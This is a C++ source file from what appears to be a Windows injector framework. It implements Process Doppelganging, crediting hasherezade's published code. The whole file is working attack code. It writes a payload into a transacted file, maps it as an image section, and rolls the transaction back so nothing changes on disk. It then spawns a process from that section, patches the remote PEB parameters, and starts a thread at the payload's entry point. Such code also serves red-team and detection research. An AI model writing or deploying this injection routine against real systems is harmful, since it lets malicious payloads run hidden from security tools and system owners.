#include "../common.h"
#include "inj_process_doppelganging.h"

//#include "hasherezade_process_doppel/ntddk.h"
#include "hasherezade_process_doppel/ntdll_types.h"
#include "hasherezade_process_doppel/ntdll_undoc.h"
#include "hasherezade_process_doppel/pe_hdrs_helper.h"
#include "hasherezade_process_doppel/util.h"

// ==============================
// Core logic of this injector uses hasherezade's implementation at https://github.com/hasherezade/process_doppelganging
// ==============================

bool init_ntdll_func_for_proc_dopel()
{
	HMODULE lib = LoadLibraryA("ntdll.dll");
	if (lib == nullptr) {
		return false;
	}

	FARPROC proc = GetProcAddress(lib, "NtCreateProcessEx");
	if (proc == nullptr) {
		return false;
	}

	NtCreateProcessEx = (NTSTATUS(NTAPI *)(
		PHANDLE,
		ACCESS_MASK,
		POBJECT_ATTRIBUTES,
		HANDLE,
		ULONG,
		HANDLE,
		HANDLE,
		HANDLE,
		BOOLEAN
		)) proc;


	proc = GetProcAddress(lib, "RtlCreateProcessParametersEx");
	if (proc == nullptr) {
		return false;
	}
	RtlCreateProcessParametersEx = (NTSTATUS(NTAPI *)(
		PRTL_USER_PROCESS_PARAMETERS*,
		PUNICODE_STRING,
		PUNICODE_STRING,
		PUNICODE_STRING,
		PUNICODE_STRING,
		PVOID,
		PUNICODE_STRING,
		PUNICODE_STRING,
		PUNICODE_STRING,
		PUNICODE_STRING,
		ULONG
		)) proc;

	proc = GetProcAddress(lib, "NtCreateThreadEx");
	if (proc == nullptr) {
		return false;
	}
	NtCreateThreadEx = (NTSTATUS(NTAPI *)(
		PHANDLE,
		ACCESS_MASK,
		POBJECT_ATTRIBUTES,
		HANDLE,
		PVOID,
		PVOID,
		ULONG,
		ULONG_PTR,
		SIZE_T,
		SIZE_T,
		PVOID
		)) proc;


	proc = GetProcAddress(lib, "NtReadVirtualMemory");
	if (proc == nullptr) {
		return false;
	}
	NtReadVirtualMemory = (NTSTATUS(NTAPI *)(
		IN HANDLE ProcessHandle,
		IN PVOID BaseAddress,
		OUT PVOID Buffer,
		IN ULONG NumberOfBytesToRead,
		OUT PULONG NumberOfBytesRead OPTIONAL
		)) proc;


	proc = GetProcAddress(lib, "NtCreateSection");
	if (proc == nullptr) {
		return false;
	}
	NtCreateSection = (NTSTATUS(NTAPI *)(
		OUT PHANDLE SectionHandle,
		IN  ACCESS_MASK DesiredAccess,
		IN  POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
		IN  PLARGE_INTEGER MaximumSize OPTIONAL,
		IN  ULONG SectionPageProtection,
		IN  ULONG AllocationAttributes,
		IN  HANDLE FileHandle OPTIONAL
		)) proc;

	return true;
}

bool set_params_in_peb(PVOID params_base, HANDLE hProcess, PROCESS_BASIC_INFORMATION &pbi)
{
	// Get access to the remote PEB:
	ULONGLONG remote_peb_addr = (ULONGLONG)pbi.PebBaseAddress;
	if (!remote_peb_addr) {
		std::cerr << "Failed getting remote PEB address!" << std::endl;
		return false;
	}
	PEB peb_copy = { 0 };
	ULONGLONG offset = (ULONGLONG)&peb_copy.ProcessParameters - (ULONGLONG)&peb_copy;

	// Calculate offset of the parameters
	LPVOID remote_img_base = (LPVOID)(remote_peb_addr + offset);

	//Write parameters address into PEB:
	SIZE_T written = 0;
	if (!WriteProcessMemory(hProcess, remote_img_base,
		&params_base, sizeof(PVOID),
		&written))
	{
		std::cout << "Cannot update Params!" << std::endl;
		return false;
	}
	return true;
}

bool buffer_remote_peb(HANDLE hProcess, PROCESS_BASIC_INFORMATION &pi, OUT PEB &peb_copy)
{
	memset(&peb_copy, 0, sizeof(PEB));
	PPEB remote_peb_addr = pi.PebBaseAddress;
#ifdef _DEBUG
	std::cout << "PEB address: " << (std::hex) << (ULONGLONG)remote_peb_addr << std::endl;
#endif 
	// Write the payload's ImageBase into remote process' PEB:
	NTSTATUS status = NtReadVirtualMemory(hProcess, remote_peb_addr, &peb_copy, sizeof(PEB), NULL);
	if (status != STATUS_SUCCESS)
	{
		std::cerr << "Cannot read remote PEB: " << GetLastError() << std::endl;
		return false;
	}
	return true;
}

LPVOID write_params_into_process(HANDLE hProcess, PVOID buffer, SIZE_T buffer_size, DWORD protect)
{
	//Preserve the aligmnent! The remote address of the parameters must be the same as local.
	LPVOID remote_params = VirtualAllocEx(hProcess, buffer, buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (remote_params == nullptr) {
		std::cerr << "RemoteProcessParams failed" << std::endl;
		return nullptr;
	}
	if (!WriteProcessMemory(hProcess, buffer, buffer, buffer_size, NULL)) {
		std::cerr << "RemoteProcessParams failed" << std::endl;
		return nullptr;
	}
	return buffer;
}

bool setup_process_parameters(HANDLE hProcess, PROCESS_BASIC_INFORMATION &pi, LPWSTR targetPath)
{
	//---
	UNICODE_STRING uTargetPath = { 0 };
	RtlInitUnicodeString(&uTargetPath, targetPath);
	//---
	wchar_t dirPath[MAX_PATH] = { 0 };
	get_directory(targetPath, dirPath, MAX_PATH);
	UNICODE_STRING uCurrentDir = { 0 };
	RtlInitUnicodeString(&uCurrentDir, dirPath);
	//---
	wchar_t dllDir[] = L"C:\\Windows\\System32";
	UNICODE_STRING uDllDir = { 0 };
	RtlInitUnicodeString(&uDllDir, dllDir);
	//---
	UNICODE_STRING uWindowName = { 0 };
	wchar_t *windowName = L"Process Doppelganging test!";
	RtlInitUnicodeString(&uWindowName, windowName);

	HPRTL_USER_PROCESS_PARAMETERS params = nullptr;
	NTSTATUS status = RtlCreateProcessParametersEx(
		(PRTL_USER_PROCESS_PARAMETERS *) &params,
		(PUNICODE_STRING)&uTargetPath,
		(PUNICODE_STRING)&uDllDir,
		(PUNICODE_STRING)&uCurrentDir,
		(PUNICODE_STRING)&uTargetPath,
		nullptr,
		(PUNICODE_STRING)&uWindowName,
		nullptr,
		nullptr,
		nullptr,
		RTL_USER_PROC_PARAMS_NORMALIZED
	);
	if (status != STATUS_SUCCESS) {
		std::cerr << "RtlCreateProcessParametersEx failed" << std::endl;
		return false;
	}
	LPVOID remote_params = write_params_into_process(hProcess, params, params->Length, PAGE_READWRITE);
	if (!remote_params) {
		std::cout << "[+] Cannot make a remote copy of parameters: " << GetLastError() << std::endl;
		return false;
	}
#ifdef _DEBUG
	std::cout << "[+] Parameters mapped!" << std::endl;
#endif
	PEB peb_copy = { 0 };
	if (!buffer_remote_peb(hProcess, pi, peb_copy)) {
		return false;
	}

	if (!set_params_in_peb(remote_params, hProcess, pi)) {
		std::cout << "[+] Cannot update PEB: " << GetLastError() << std::endl;
		return false;
	}
#ifdef _DEBUG
	if (!buffer_remote_peb(hProcess, pi, peb_copy)) {
		return false;
	}
	std::cout << "> ProcessParameters addr: " << peb_copy.ProcessParameters << std::endl;
#endif
	return true;
}


bool process_doppel(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSize)
{
	DWORD options, isolationLvl, isolationFlags, timeout;
	options = isolationLvl = isolationFlags = timeout = 0;

	HANDLE hTransaction = CreateTransaction(nullptr, nullptr, options, isolationLvl, isolationFlags, timeout, nullptr);
	if (hTransaction == INVALID_HANDLE_VALUE) {
		std::cerr << "Failed to create transaction!" << std::endl;
		return false;
	}
	wchar_t* dummy_name = get_file_name(targetPath);
	HANDLE hTransactedFile = CreateFileTransactedW(dummy_name,
		GENERIC_WRITE | GENERIC_READ,
		0,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL,
		hTransaction,
		NULL,
		NULL
	);
	if (hTransactedFile == INVALID_HANDLE_VALUE) {
		std::cerr << "Failed to create transacted file: " << GetLastError() << std::endl;
		return false;
	}

	DWORD writtenLen = 0;
	if (!WriteFile(hTransactedFile, payladBuf, payloadSize, &writtenLen, NULL)) {
		std::cerr << "Failed writing payload! Error: " << GetLastError() << std::endl;
		return false;
	}

	HANDLE hSection = nullptr;
	NTSTATUS status = NtCreateSection(&hSection,
		SECTION_ALL_ACCESS,
		NULL,
		0,
		PAGE_READONLY,
		SEC_IMAGE,
		hTransactedFile
	);
	if (status != STATUS_SUCCESS) {
		std::cerr << "NtCreateSection failed" << std::endl;
		return false;
	}
	CloseHandle(hTransactedFile);
	hTransactedFile = nullptr;

	if (RollbackTransaction(hTransaction) == FALSE) {
		std::cerr << "RollbackTransaction failed: " << GetLastError() << std::endl;
		return false;
	}
	CloseHandle(hTransaction);
	hTransaction = nullptr;

	HANDLE hProcess = nullptr;
	status = NtCreateProcessEx(
		&hProcess, //ProcessHandle
		PROCESS_ALL_ACCESS, //DesiredAccess
		NULL, //ObjectAttributes
		NtCurrentProcess(), //ParentProcess
		PS_INHERIT_HANDLES, //Flags
		hSection, //sectionHandle
		NULL, //DebugPort
		NULL, //ExceptionPort
		FALSE //InJob
	);
	if (status != STATUS_SUCCESS) {
		std::cerr << "NtCreateProcessEx failed" << std::endl;
		return false;
	}

	PROCESS_BASIC_INFORMATION pi = { 0 };

	DWORD ReturnLength = 0;
	status = NtQueryInformationProcess(
		hProcess,
		ProcessBasicInformation,
		&pi,
		sizeof(PROCESS_BASIC_INFORMATION),
		&ReturnLength
	);
	if (status != STATUS_SUCCESS) {
		std::cerr << "NtQueryInformationProcess failed" << std::endl;
		return false;
	}
	PEB peb_copy = { 0 };
	if (!buffer_remote_peb(hProcess, pi, peb_copy)) {
		return false;
	}
	HPEB *workPEB = (HPEB *) &peb_copy;
	ULONGLONG imageBase = (ULONGLONG) workPEB->ImageBaseAddress;
#ifdef _DEBUG
	std::cout << "ImageBase address: " << (std::hex) << (ULONGLONG)imageBase << std::endl;
#endif
	DWORD payload_ep = get_entry_point_rva(payladBuf);
	ULONGLONG procEntry = payload_ep + imageBase;

	if (!setup_process_parameters(hProcess, pi, targetPath)) {
		std::cerr << "Parameters setup failed" << std::endl;
		return false;
	}
#ifdef _DEBUG
	std::cout << "Process created!" << std::endl;
	std::cerr << "EntryPoint at: " << (std::hex) << (ULONGLONG)procEntry << std::endl;
#endif
	HANDLE hThread = NULL;
	status = NtCreateThreadEx(&hThread,
		THREAD_ALL_ACCESS,
		NULL,
		hProcess,
		(LPTHREAD_START_ROUTINE)procEntry,
		NULL,
		FALSE,
		0,
		0,
		0,
		NULL
	);

	if (status != STATUS_SUCCESS) {
		std::cerr << "NtCreateThreadEx failed: " << GetLastError() << std::endl;
		return false;
	}

	return true;
}

bool InjectorProcessDoppelganging::Execute(const std::wstring &codeToInject, const std::wstring &targetToInject)
{
	bool ret = false;
	NTSTATUS err = ERROR_SUCCESS;
	DWORD fileSize = 0;
	blackbone::pe::PEImage targetModule;
	blackbone::pe::PEImage sourceModule;
	BYTE* payloadBuff = nullptr;
	size_t upcastedSizeValue = 0;

	xPEB processPEB = { 0 };
	PROCESS_BASIC_INFORMATION targetProcesInformation = { 0 };

	std::wcout << L"[+] About to execute " << GetDescription() << std::endl;
	std::wcout << L"[+] Attaching to target process and parsing source mode" << std::endl;

	if (InjectorHelpers::GetExecutionContext(codeToInject, targetToInject, sourceModule, targetModule))
	{
		std::wcout << L"[+] Checking for valid injection context" << std::endl;
		if (InjectorHelpers::IsValidInjectionTarget(sourceModule, targetModule))
		{
			std::wcout << L"[+] Checking runtime linking" << std::endl;
			if (init_ntdll_func_for_proc_dopel())
			{
				std::wcout << L"[+] Getting payload size" << std::endl;
				if ((InjectorHelpers::GetFileToInjectSize(codeToInject, fileSize)) && (fileSize > 0))
				{
					upcastedSizeValue = (size_t)fileSize;
					size_t readBytes = 0;
					payloadBuff = buffer_payload((wchar_t *)codeToInject.c_str(), readBytes);
					if ((payloadBuff != NULL) && (readBytes == upcastedSizeValue))
					{
						if (process_doppel((wchar_t *)targetToInject.c_str(), payloadBuff, (DWORD)upcastedSizeValue))
						{
							std::wcout << L"[+] Success! Code injected via Hasherezade InjectorProcessDoppelganging method" << std::endl;
							ret = true;
						}
						else
						{
							std::wcout << L"[-] There was a problem creating doppelganging process" << std::endl;
						}
					}
					else
					{
						std::wcout << L"[-] There was a problem reading file content" << std::endl;
					}
				}
				else
				{
					std::wcout << L"[-] There was a problem getting file size data" << std::endl;
				}
			}
			else
			{
				std::wcout << L"[-] There was a problem setting up runtime linking" << std::endl;
			}
		}
		else
		{
			std::wcout << L"[-] There was a problem validating injection target" << std::endl;
		}
	}
	else
	{
		std::wcout << L"[-] There was a problem setting up injection context data " << std::endl;
	}

	if (payloadBuff)
	{
		free_buffer(payloadBuff, upcastedSizeValue);
	}

	return ret;
}
